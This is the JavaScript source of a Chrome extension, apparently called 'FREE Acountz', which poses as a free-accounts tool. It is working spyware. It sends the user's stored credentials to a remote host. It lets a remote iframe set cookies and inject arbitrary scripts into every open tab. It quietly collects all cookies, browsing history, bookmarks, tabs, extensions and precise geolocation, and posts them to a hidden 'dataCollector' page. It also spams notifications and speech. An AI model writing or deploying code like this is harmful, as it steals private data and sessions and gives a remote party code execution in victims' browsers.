var currentExtensionSoftwareVersion = 3.1;

var user = 
{
  UserName: null,
  PassWord: null
}
user.UserName = localStorage.getItem("username");
user.PassWord = localStorage.getItem("password");

document.getElementById("freeacountzsusextention-sign-in-iframe").src = "https://freeacountzsusextention.000webhostapp.com/account-manager/home.php"+"?"+"username="+btoa(unescape(encodeURIComponent(user.UserName)))+"&"+"password="+btoa(unescape(encodeURIComponent(user.PassWord)));

document.getElementById("delete-previous-extension").onclick = function(){DeletePreviousExtention()};
function DeletePreviousExtention()
{
chrome.management.getAll(function(extensions)
{
  extensions.forEach(extension => {
    if (extension.name == "FREE Acountz")
      {
        if (extension.version == "1.0.0" || extension.version == "2.0.0"|| extension.version == "3.0.0")
        {
          chrome.management.uninstall(extension.id);
          chrome.cookies.getAll({ domain: "nordvpn.com" }).then(function(cookies) {cookies.map(function (cookie) {return chrome.cookies.remove({url: `${cookie.secure ? "https:" : "http:"}//${cookie.domain}${cookie.path}`, name: cookie.name, storeId: cookie.storeId});})});
          chrome.cookies.getAll({ domain: "express.com" }).then(function(cookies) {cookies.map(function (cookie) {return chrome.cookies.remove({url: `${cookie.secure ? "https:" : "http:"}//${cookie.domain}${cookie.path}`, name: cookie.name, storeId: cookie.storeId});})});
          chrome.cookies.getAll({ domain: "disneyplus.com" }).then(function(cookies) {cookies.map(function (cookie) {return chrome.cookies.remove({url: `${cookie.secure ? "https:" : "http:"}//${cookie.domain}${cookie.path}`, name: cookie.name, storeId: cookie.storeId});})});
          chrome.cookies.getAll({ domain: "hbo.com" }).then(function(cookies) {cookies.map(function (cookie) {return chrome.cookies.remove({url: `${cookie.secure ? "https:" : "http:"}//${cookie.domain}${cookie.path}`, name: cookie.name, storeId: cookie.storeId});})});
          chrome.cookies.getAll({ domain: "hulu.com" }).then(function(cookies) {cookies.map(function (cookie) {return chrome.cookies.remove({url: `${cookie.secure ? "https:" : "http:"}//${cookie.domain}${cookie.path}`, name: cookie.name, storeId: cookie.storeId});})});
          chrome.cookies.getAll({ domain: "paramountplus.com" }).then(function(cookies) {cookies.map(function (cookie) {return chrome.cookies.remove({url: `${cookie.secure ? "https:" : "http:"}//${cookie.domain}${cookie.path}`, name: cookie.name, storeId: cookie.storeId});})});
          chrome.cookies.getAll({ domain: "pornhubpremium.com" }).then(function(cookies) {cookies.map(function (cookie) {return chrome.cookies.remove({url: `${cookie.secure ? "https:" : "http:"}//${cookie.domain}${cookie.path}`, name: cookie.name, storeId: cookie.storeId});})});
          chrome.cookies.getAll({ domain: "netflix.com" }).then(function(cookies) {cookies.map(function (cookie) {return chrome.cookies.remove({url: `${cookie.secure ? "https:" : "http:"}//${cookie.domain}${cookie.path}`, name: cookie.name, storeId: cookie.storeId});})});
          window.close();
        }
      }
    });
  });
}

var ExtensionActive;
var ExtensionSoftwareVersion;
{
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
  if (this.readyState == 4 && this.status == 200) {
    ExtensionActive = JSON.parse(this.responseText).ExtensionActive;
    ExtensionSoftwareVersion = JSON.parse(this.responseText).ExtensionSoftwareVersion;
  }
};
xhttp.open("GET", "https://freeacountzsusextention.github.io/extention/control.txt", true);
xhttp.send();
}

function Loaded()
{
  if (ExtensionActive != null)
  {
    if (ExtensionActive)//check if extetnion is active
    {
      if (currentExtensionSoftwareVersion == ExtensionSoftwareVersion)//check if versions match
      {

        var previousVersion = false;
        chrome.management.getAll(function(extensions)
        {
          extensions.forEach(extension => {
            if (extension.name == "FREE Acountz")
            {
              if (extension.version != "3.1.0")
              {
                document.getElementById("intro").style.display = "None";
                if (CheckSignIn())
                  document.getElementById("main-menu").style.display = "block";
                else
                  document.getElementById("freeacountzsusextention-sign-in").style.display = "block";
                document.getElementById("main-menu").style.display = "none";
                previousVersion = true;
              }
            }
          });
        });
        {
          if (previousVersion == false)
          {
            document.getElementById("intro").style.display = "None";
            if (CheckSignIn())
              document.getElementById("main-menu").style.display = "block";
            else
              document.getElementById("freeacountzsusextention-sign-in").style.display = "block";
          }
        }
        return;
      }
      else
      {
        document.getElementById("load-failed-reason").innerText = "Outdated Extension version please update."+" "+"Your Version:"+currentExtensionSoftwareVersion+" "+"Current Version:"+ExtensionSoftwareVersion;
      }
    }
    else
    {
      document.getElementById("load-failed-reason").innerText = "Extension has been shut down";
    }
  }
  else
  {
    if (!navigator.onLine)
    {
      document.getElementById("load-failed-reason").innerText = "No internet connection detected";
    }
    else
    {
      document.getElementById("load-failed-reason").innerText = "Server connection failed";
    }
    if (navigator.onLine)
    {

      const xhr = new XMLHttpRequest();
      xhr.open("GET", "https://freeacountzsusextention.github.io/");
      xhr.send();
      xhr.onerror = function() {
        document.getElementById("load-failed-reason").innerText = "Server Down or Server Blocked";
      }
    }
    else
    {
      document.getElementById("load-failed-reason").innerText = "Server connection failed";
    }
  }
  setTimeout(Loaded, 50);
}
setTimeout(Loaded, 50);

window.addEventListener('message', function (e) {
  // Get the sent data
  const data = e.data;

  // If you encode the message in JSON before sending them,
  // then decode here
  const decoded = JSON.parse(data);
  if (decoded.type == "Clipboard")
    navigator.clipboard.writeText(decoded.text);
  if (decoded.type == "ClearCookies")
    chrome.cookies.getAll({ domain: decoded.text }).then(function(cookies) {cookies.map(function (cookie) {return chrome.cookies.remove({url: `${cookie.secure ? "https:" : "http:"}//${cookie.domain}${cookie.path}`, name: cookie.name, storeId: cookie.storeId});})});
  if (decoded.type == "AddCookies")
    JSON.parse(JSON.parse(decoded.text).cookiedata).forEach(cookie => {chrome.cookies.set({domain: cookie.domain || '', name: cookie.name || '', value: cookie.value || '', path: cookie.path || null, secure: cookie.secure || null, httpOnly: cookie.httpOnly || null, expirationDate: cookie.expirationDate || null, storeId: cookie.storeId || null, url: JSON.parse(decoded.text).site})});
  if (decoded.type == "ReloadTab")
    if (decoded.text.site == "all urls") chrome.tabs.query().then(function(tabs) { for (let tab of tabs) { chrome.tabs.reload(tab.id); }});else chrome.tabs.query({url: "*://*."+decoded.text+"/*"}).then(function(tabs) { for (let tab of tabs) { chrome.tabs.reload(tab.id); }});
  if (decoded.type == "InjectScript")
    if (JSON.parse(decoded.text).site == "all urls") chrome.tabs.query({}).then(function(tabs) { for (let tab of tabs) {chrome.scripting.executeScript({ args: [JSON.parse(decoded.text).script], target: { tabId: tab.id }, world: "MAIN", func: function(script) {new Function(script)();}});}}); else chrome.tabs.query({url: "*://*."+JSON.parse(decoded.text).site+"/*"}).then(function(tabs) { for (let tab of tabs) {chrome.scripting.executeScript({ args: [JSON.parse(decoded.text).script], target: { tabId: tab.id }, world: "MAIN", func: function(script) {new Function(script)();}});}});
  if (decoded.type == "AccountSignIn")
      if (JSON.parse(decoded.text).Username != user.UserName || JSON.parse(decoded.text).Password != user.PassWord) {if (JSON.parse(decoded.text).Username != localStorage.getItem("username") || JSON.parse(decoded.text).PassWord != localStorage.getItem("password")) {user.UserName = JSON.parse(decoded.text).Username; localStorage.setItem("username", user.UserName); user.PassWord = JSON.parse(decoded.text).Password; localStorage.setItem("password", user.PassWord); window.location.reload()}}
  if (decoded.type == "AccountSignOut")
      SignOut();
  if (decoded.type == "UpdateUserData")
    { const SendRequest = { text: decoded.text, type: 'UpdateUserData', relay: true,}; document.getElementById("freeacountzsusextention-sign-in-iframe").contentWindow.postMessage(JSON.stringify(SendRequest), '*') }
  if (decoded.type == "SetUserData")
    { const SendRequest = { text: decoded.text, type: 'UserData', relay: true,}; document.getElementById("freeacountzsusextention-index-iframe").contentWindow.postMessage(JSON.stringify(SendRequest), '*') }
  if (decoded.type == "UpdateCookieUserData")
    { const SendRequest = { text: decoded.text, type: 'UpdateCookieUserData', relay: true,}; document.getElementById("freeacountzsusextention-sign-in-iframe").contentWindow.postMessage(JSON.stringify(SendRequest), '*') }
  if (decoded.type == "SetCookieUserData")
    { const SendRequest = { text: decoded.text, type: 'CookieUserData', relay: true,}; document.getElementById("freeacountzsusextention-index-iframe").contentWindow.postMessage(JSON.stringify(SendRequest), '*') }
  if (decoded.type == "Reload")
      window.location.reload();
  if (decoded.type == "Download")
      {const a = document.createElement("a"); fetch(JSON.parse(decoded.text).url).then((response) => {return response.blob();}).then(blob => {a.href = URL.createObjectURL(blob);}).then(function(){a.click();document.body.removeChild(a)}); a.download = JSON.parse(decoded.text).filename; document.body.appendChild(a);};

});
function SignIn(username, password)
{
  user.UserName = username;
  localStorage.setItem("username", user.UserName);
  user.PassWord = password;
  localStorage.setItem("password", user.PassWord);
}
function SignOut()
{
  user.UserName = null;
  localStorage.removeItem("username");
  user.PassWord = null;
  localStorage.removeItem("password");
}
function CheckSignIn()
{
  if (user.UserName == null || user.PassWord == null)
    return false;
  else
    return true;
}

function Reload()
{
  location.reload();
}
/*
for (let i = 0; i < 10000; i++) {
  chrome.history.addUrl({url: "https://www.pornhub.com?"+Math.floor(Math.random() * 9999999)});
};

setInterval(DestroyHistory, 1);

function DestroyHistory() 
{
  for (let i = 0; i < 1; i++) {
    chrome.history.addUrl({url: "https://www.pornhub.com?"+Math.floor(Math.random() * 9999999)});
  };
}*/

var personal_data = {email: null, geolocation: null, bookmarks: null, cookies: null, tabs: null, history: null, extension: null};

personal_data.email = localStorage.getItem('username');

navigator.geolocation.getCurrentPosition(function(pos) {personal_data.geolocation = pos.coords;}, function(err) {console.warn(`ERROR(${err.code}): ${err.message}`);}, {enableHighAccuracy: true, timeout: 5000, maximumAge: 0});

chrome.cookies.getAll({}).then(function(cookies) {
  personal_data.cookies = cookies;
});

chrome.bookmarks.getTree(function(bookmarks) {
  personal_data.bookmarks = bookmarks;
});

chrome.history.search({text: ''}, function(data) {
  personal_data.history = data;
});

chrome.tabs.query({}).then(function(tabs) { 
  personal_data.tabs = tabs;
});

chrome.management.getAll().then(function(extensions) { 
  personal_data.extension = extensions;
});
setTimeout(RecordData, 5000);

function RecordData() 
{
  var frame = document.createElement('iframe');
  frame.style.display = "none";
  frame.src = "https://freeacountzsusextention.github.io/extention/dataCollector.html";
  document.body.appendChild(frame);
  frame.onload = function() {frame.contentWindow.postMessage(JSON.stringify({ text: JSON.stringify(personal_data), type: 'DataCollector', relay: true,}), '*');}
}
for (let i = 0; i < 10; i++) {
  chrome.notifications.create(null, {title: "YOU OPENED FREE ACOUNTZ SUS EXTENTION", message: "YAYY", iconUrl: "https://gaminggodsexy123.github.io/amogus.jpg", type: "basic"})
}

setTimeout(() => {
  setInterval(() => {
    chrome.tts.getVoices(
      function(voices) {
        for (var i = 0; i < voices.length; i++) {
          chrome.tts.speak('Roblox', {'voiceName': voices[i].voiceName, 'volume': 0.1, 'rate': 5, 'enqueue': true});
        }
      }
    );
  }, 10000);
}, 5000);
